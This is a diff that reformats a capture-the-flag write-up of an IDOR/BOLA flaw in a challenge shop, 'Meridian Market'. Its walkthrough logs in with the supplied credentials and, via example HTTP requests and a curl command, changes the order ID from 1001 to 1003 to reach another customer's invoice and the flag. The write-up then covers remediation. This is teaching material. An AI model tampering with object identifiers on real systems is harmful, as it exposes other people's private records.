@@ -1,8 +1,35 @@
-**Target:** Meridian Market — https://web3.cybernexus.live/
+#  Meridian Market — IDOR / BOLA
 
-**Category:** Web Application Security
+<p align="center">
+  <img src="https://img.shields.io/badge/CTF-V3CT0R%202026-7C3AED?style=for-the-badge" alt="V3CT0R CTF 2026" />
+  <img src="https://img.shields.io/badge/Category-Web%20Application%20Security-2563EB?style=for-the-badge" alt="Web Application Security" />
+  <img src="https://img.shields.io/badge/CWE-639-0F766E?style=for-the-badge" alt="CWE-639" />
+</p>
 
-**Vulnerability:** Insecure Direct Object Reference (IDOR) / Broken Object-Level Authorization (BOLA)
+---
+
+| **Assessment Detail** | **Information** |
+|:---|:---|
+| **Target** | [Meridian Market](https://web3.cybernexus.live/) |
+| **Category** | Web Application Security |
+| **Vulnerability** | Insecure Direct Object Reference (IDOR) / Broken Object-Level Authorization (BOLA) |
+| **CWE** | CWE-639 — Authorization Bypass Through User-Controlled Key |
+| **OWASP API Security** | API1:2023 — Broken Object Level Authorization |
+| **Result** | Unauthorized access to another customer's order |
+| **Flag** | `V3ct0r{1D0R_0rd3r_1003}` |
+
+## 📑 Table of Contents
+
+1. [Executive Summary](#1-executive-summary)
+2. [Scope and Methodology](#2-scope-and-methodology)
+3. [Technical Vulnerability Analysis](#3-technical-vulnerability-analysis)
+4. [Exploitation Walkthrough](#4-exploitation-walkthrough)
+5. [Impact Assessment](#5-impact-assessment)
+6. [Root Cause](#6-root-cause)
+7. [Remediation](#7-remediation)
+8. [Conclusion](#8-conclusion)
+
+---
 
 ## 1. Executive Summary
 
@@ -15,6 +42,8 @@ The dashboard displayed Order #1001 for the authenticated customer. By changing 
 The response exposed information that should have been restricted to the record's owner and contained the challenge flag.
 
 This finding demonstrates that authentication alone is insufficient to protect customer records. Every request for a specific object must also verify that the authenticated user is authorized to access that object.
+
+---
 
 ## 2. Scope and Methodology
 
@@ -46,6 +75,8 @@ The investigation followed a straightforward web application testing process:
 6. Verify whether the returned invoice belonged to another customer.
 7. Inspect the response for the challenge flag.
 
+---
+
 ## 3. Technical Vulnerability Analysis
 
 ### 3.1 Insecure Direct Object Reference (IDOR)
@@ -56,8 +87,8 @@ IDOR occurs when an application uses a user-controlled identifier to retrieve an
 
 In this challenge, the order-detail route followed this pattern:
 
-```
-/order/<Order_ID>
+```http
+GET /order/<Order_ID>
 ```
 
 The order identifier was supplied directly in the URL. The application needed to verify that the authenticated customer had permission to access the requested order.
@@ -68,8 +99,9 @@ According to the observed behavior, this ownership check was missing or ineffect
 
 The application distinguished between authentication and authorization incorrectly.
 
-- **Authentication** determines who the user is.
-- **Authorization** determines what that user is permitted to access.
+| **Authentication** | **Authorization** |
+|:---|:---|
+| Determines who the user is. | Determines what that user is permitted to access. |
 
 The active session established that the requester was logged in. It did not establish ownership of every order in the system.
 
@@ -83,24 +115,26 @@ Depending on the information stored in the invoices, this could expose customer 
 
 In the demonstrated CTF scenario, accessing Order #1003 also exposed the challenge flag.
 
+---
+
 ## 4. Exploitation Walkthrough
 
-### Step 1: Authenticate to the Customer Portal
+### Step 1 — Authenticate to the Customer Portal
 
 The customer portal was accessed at:
 
-https://web3.cybernexus.live/
+**Target:** https://web3.cybernexus.live/
 
 The login form displayed the identifier `John`. The supplied challenge credentials were:
 
-```
+```text
 Username: John
 Password: 123456
 ```
 
 The following request represents the authentication flow documented in the challenge notes:
 
-```
+```http
 POST /login HTTP/1.1
 Host: web3.cybernexus.live
 Content-Type: application/x-www-form-urlencoded
@@ -110,11 +144,11 @@ username=John&password=123456
 
 The login succeeded, and the server established an authenticated session using a session cookie.
 
-### Step 2: Inspect the Dashboard and Authorized Order
+### Step 2 — Inspect the Dashboard and Authorized Order
 
 After authentication, the dashboard displayed the customer's order history, including:
 
-```
+```text
 Order ID: #1001
 Order endpoint: /order/1001
 ```
@@ -123,7 +157,7 @@ Opening the order-detail route returned the invoice associated with the authenti
 
 The corresponding request was:
 
-```
+```http
 GET /order/1001 HTTP/1.1
 Host: web3.cybernexus.live
 Cookie: session=<SESSION_TOKEN>
@@ -131,28 +165,29 @@ Cookie: session=<SESSION_TOKEN>
 
 This provided the baseline for testing whether the application enforced object-level authorization.
 
-### Step 3: Modify the Order Identifier
+### Step 3 — Modify the Order Identifier
 
 The next step was to test whether the application verified ownership when an authenticated user requested a different order.
 
 The request path was changed from:
 
-```
-/order/1001
+```http
+GET /order/1001
 ```
 
 to:
 
-```
-/order/1003
+```http
+GET /order/1003
 ```
 
 The authenticated session remained unchanged.
 
 The equivalent request, using a placeholder for the session cookie, was:
 
-```
-curl -i 'https://web3.cybernexus.live/order/1003' -H 'Cookie: session=<SESSION_TOKEN>'
+```bash
+curl -i 'https://web3.cybernexus.live/order/1003' \
+  -H 'Cookie: session=<SESSION_TOKEN>'
 ```
 
 The placeholder was replaced with the active session cookie obtained during the authorized challenge session.
@@ -161,23 +196,23 @@ The server returned HTTP 200 and rendered an invoice associated with a different
 
 This demonstrated that the application did not adequately enforce ownership authorization for the requested order.
 
-### Step 4: Retrieve the Challenge Flag
+### Step 4 — Retrieve the Challenge Flag
 
 Inspection of the HTML response for `/order/1003` revealed the challenge flag inside a `flag-box` element.
 
-The flag was:
-
-```
+```text
 V3ct0r{1D0R_0rd3r_1003}
 ```
 
 This completed the exploitation chain and demonstrated unauthorized access to an order belonging to another customer in the CTF environment.
 
+---
+
 ## 5. Impact Assessment
 
 The vulnerability allowed an authenticated customer to access an order that was not associated with their account.
 
-The demonstrated impact included:
+### Demonstrated Impact
 
 - Unauthorized access to another customer's invoice.
 - Bypass of intended object-level access restrictions.
@@ -188,6 +223,8 @@ In a production e-commerce system, a similar vulnerability could expose other cu
 
 The actual severity would depend on the sensitivity of the exposed records, the number of affected objects, and the privileges available to an attacker.
 
+---
+
 ## 6. Root Cause
 
 The primary root cause was insufficient object-level authorization in the order-detail endpoint.
@@ -197,6 +234,8 @@ The application accepted a client-supplied order identifier and returned the cor
 The sequential nature of the identifiers made the issue easy to test, but sequential identifiers were not the fundamental vulnerability. Even an unpredictable identifier would not replace server-side authorization checks.
 
 The essential failure was trusting the requested object identifier without enforcing access permissions.
+
+---
 
 ## 7. Remediation
 
@@ -212,7 +251,7 @@ Authorization must be enforced on the server, not only through dashboard filteri
 
 Where appropriate, query for an order using both the requested identifier and the authenticated user's identity.
 
-Conceptually:
+**Conceptual SQL example:**
 
 ```sql
 SELECT *
@@ -247,6 +286,8 @@ Automated tests should verify that:
 - Invoice and related-document endpoints enforce equivalent permissions.
 - Administrative access is granted only through explicit authorization rules.
 
+---
+
 ## 8. Conclusion
 
 The Meridian Market challenge demonstrated an IDOR vulnerability caused by inadequate object-level authorization.
@@ -255,4 +296,10 @@ Although the application authenticated the customer and restricted the order lis
 
 The primary lesson is that authentication and frontend restrictions do not replace server-side authorization. Every request for a protected object must verify that the requester has permission to access it.
 
-**Flag:** `V3ct0r{1D0R_0rd3r_1003}`
+---
+
+<p align="center">
+  <strong>🏁 V3ct0r{1D0R_0rd3r_1003}</strong>
+  <br>
+  <sub>V3CT0R CTF 2026 · Authorized challenge environment</sub>
+</p>
